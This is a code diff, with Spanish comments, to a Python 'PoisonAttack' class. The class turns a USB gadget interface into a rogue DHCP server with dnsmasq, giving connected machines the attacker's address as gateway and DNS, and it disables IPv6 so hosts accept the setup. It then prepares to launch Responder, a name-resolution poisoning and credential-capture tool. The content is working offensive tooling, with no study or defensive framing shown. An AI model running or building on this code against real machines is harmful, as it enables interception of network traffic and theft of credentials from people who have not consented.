@@ -59,19 +59,19 @@ class PoisonAttack:
         self.log(f"[*] Configurando interfaz: {iface}")
 
         try:
-            # === INICIO BLOQUE CORREGIDO ===
             self.log("[*] Desvinculando interfaz de gestores de red...")
             os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
             os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
             time.sleep(1)
 
-            self.log("[*] Reset de interfaz y supresión IPv6...")
+            self.log("[*] Reset de interfaz y supresión IPv6/RA...")
             os.system(f"sudo ip link set {iface} down 2>/dev/null")
             time.sleep(1)
             os.system(f"sudo ip link set {iface} up")
             time.sleep(2)
 
+            # CRÍTICO PARA LINUX: Evita que NetworkManager espere SLAAC/Router Advertisements
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
@@ -86,39 +86,42 @@ class PoisonAttack:
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
             os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
 
+            # Configuración dnsmasq optimizada para Gadget USB (Linux/Windows)
             config_dhcp = (
                 f"interface={iface}\n"
                 f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
-                f"dhcp-option=3,{ip}\n"
-                f"dhcp-option=6,{ip}\n"
-                f"dhcp-option=15,\n"
-                f"dhcp-option=252,\n"
-                f"bind-dynamic\n"
-                f"no-resolv\n"
-                f"no-hosts\n"
-                f"port=0\n"
-                f"log-dhcp\n"
+                f"dhcp-option=3,{ip}\n"      # Gateway
+                f"dhcp-option=6,{ip}\n"      # DNS
+                f"dhcp-option=15,\n"         # Dominio vacío (evita delay Linux/Windows)
+                f"dhcp-option=252,\n"        # WPAD vacío (evita espera proxy)
+                f"bind-dynamic\n"            # Compatible con interfaces configfs
+                f"no-resolv\n"               # Evita carga de /etc/resolv.conf
+                f"no-hosts\n"                # Ignora /etc/hosts
+                f"port=0\n"                  # DESACTIVA DNS (evita choque con systemd-resolved)
+                f"log-dhcp\n"                # Loguea concesiones DHCP en stderr
             )
             with open("dnsmasq_temp.conf", "w") as f:
                 f.write(config_dhcp)
 
             self.log("[*] Iniciando dnsmasq...")
             self.dns_proc = subprocess.Popen(
-                ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf"],
+                ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
             )
             time.sleep(2)
 
+            # Verificación de que dnsmasq está activo y aceptando DHCP
             if self.dns_proc.poll() is not None:
                 err = self.dns_proc.stderr.read()
-                self.log(f"[!] dnsmasq falló: {err.strip()}")
-                self.log("[*] Reiniciando dnsmasq en modo fallback...")
+                self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
+                self.log("[*] Reiniciando en modo fallback...")
                 self.dns_proc = subprocess.Popen(
-                    ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
+                    ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                 )
-            # === FIN BLOQUE CORREGIDO ===
+            else:
+                self.log("[+] dnsmasq escuchando correctamente.")
 
             # Detección segura de ruta de Responder
             responder_paths = [
